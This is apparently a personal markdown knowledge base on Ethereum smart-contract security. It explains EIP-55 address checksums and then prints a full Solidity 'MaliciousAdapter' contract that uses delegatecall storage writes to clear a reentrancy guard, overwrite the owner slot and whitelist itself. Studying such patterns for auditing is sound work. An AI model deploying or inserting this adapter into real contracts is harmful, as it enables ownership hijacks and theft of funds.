# Typical Security Vulnerabilities
A living knowledge base of common security issues and low-level quirks in Ethereum smart contract development. Includes real-world examples, attack patterns (like delegatecall-based ownership hijacks), and practical tooling for safe development and auditing workflows. *This document will be updated as I discover new exploits, patterns, or low-level tricks.*

---

## Ethereum Addresses Checksum
Ethereum itself (the EVM) is **not case sensitive** when it comes to addresses — you can use all lowercase addresses just fine. However, some front-end apps like **MetaMask** or **Etherscan** use a **mixed-case version** of the address for added safety. This is based on **EIP-55**, which defines a **checksum mechanism** using uppercase/lowercase letters to help catch typos.

So if you see an address like `0xF39Fd6e51aad88F6F4ce6aB8827279cffFb92266`, know that the uppercase letters are part of this checksum. You can still use the all-lowercase version — it’ll work in most tools — but mixed-case is preferred when available.

You can validate or convert an address to its checksummed version using Foundry’s `cast checksum` command:

```bash
cast to-check-sum-address 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
```

:round_pushpin: Output:

```
0xF39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```

This helps ensure the address is typed correctly — a small but useful tool for safer Ethereum development.

---

## 🧨 Delegatecall-Based Ownership Hijack

> Posted by @abhinabphy on 14.07.2025 in
> 🔥⚔🛡 ‹𝔽𝕠𝕦𝕟𝕕𝕣𝕪 & 𝔽𝕦𝕣𝕪› 🛡⚔🔥,  
> a Discord server dedicated to studying smart contract security and auditing.

This is a typical example of a **delegatecall vulnerability**, where a malicious contract abuses low-level storage writes to hijack ownership and bypass access controls.

### 🔓 `MaliciousAdapter.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

interface IAdapter {
    function executeSimpleSwap(
        address fromToken,
        address toToken,
        uint256 fromTokenAmount,
        bytes calldata data
    ) external payable;
}

contract MaliciousAdapter is IAdapter {
    function executeSimpleSwap(
        address, address, uint256, bytes calldata
    ) external payable override {
        assembly {
            // Unlock reentrancyGuard
            sstore(1, 0)

            // Overwrite owner slot (slot 0) with attacker's address
            sstore(0, 0x123)

            // Whitelist this adapter using known storage layout
            mstore(0x00, address())
            mstore(0x20, 2) // key for mapping: keccak256(address . 2)
            let slot := keccak256(0x00, 0x40)
            sstore(slot, 1)

            return(0, 0)
        }
    }

    receive() external payable {}
}
```

### 🧠 Key Takeaways:

* This exploits assumptions about storage layout (e.g., that `owner` is at slot `0`, etc.).
* These assumptions become dangerous when `delegatecall` is used to an **untrusted adapter**.
* Critical mappings and modifiers like `onlyOwner`, `reentrancyGuard`, or `whitelisted` can be **trivially bypassed** if storage alignment isn't protected.
